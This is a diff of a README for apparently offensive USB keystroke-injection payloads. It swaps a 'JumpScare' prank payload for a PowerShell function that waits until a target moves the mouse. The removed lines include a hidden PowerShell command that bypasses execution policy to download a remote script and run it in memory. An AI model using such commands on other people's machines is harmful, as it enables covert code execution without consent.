@@ -7,24 +7,41 @@
     <li><a href="#Description">Description</a></li>
     <li><a href="#getting-started">Getting Started</a></li>
     <li><a href="#Contributing">Contributing</a></li>
-    <li><a href="#Version-History">Version History</a></li>
     <li><a href="#Contact">Contact</a></li>
     <li><a href="#Acknowledgments">Acknowledgments</a></li>
   </ol>
 </details>
 
-# JumpScare
+# Pause-Till-Mouse-Move
 
-A script I put together to torment Call Center Scammers but can be used on your friends as well.. or Foes.
+A function to pause a script until a mouse movement is detected. This is useful if you want to wait for an action to take place for 
+when the target is in front of their PC. 
 
 ## Description
 
-This script starts off using Invoke-WebRequests to download both and Image and Sound file 
-Their system volume is then turned up to the max level
-The script will be paused until a mouse movement is detected 
-At that point there desktop wallpaper will be changed to the scary image provided and the scream sound effect will be played
+This function will get the position of the mouse cursor when the script is ran and save it as $originalPOS
+Using a while loop it will check the position every X seconds as indicated by the $pauseTime variable
+If the position of the cursor has not changed the capslock button will be pressed 
+This is to stop the screen from sleeping and use the capslock light as an indicator the function is still waiting 
+When a mouse movement is detected the function will break out of the loop and resume the script 
 
-## Getting Started
+## The Function
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
 
 ### Dependencies
 
@@ -33,12 +50,6 @@ At that point there desktop wallpaper will be changed to the scary image provide
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ### Executing program
-
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl
-```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -50,10 +61,6 @@ I am Jakoby
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
-## Version History
-
-* 0.1
-    * Initial Release
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
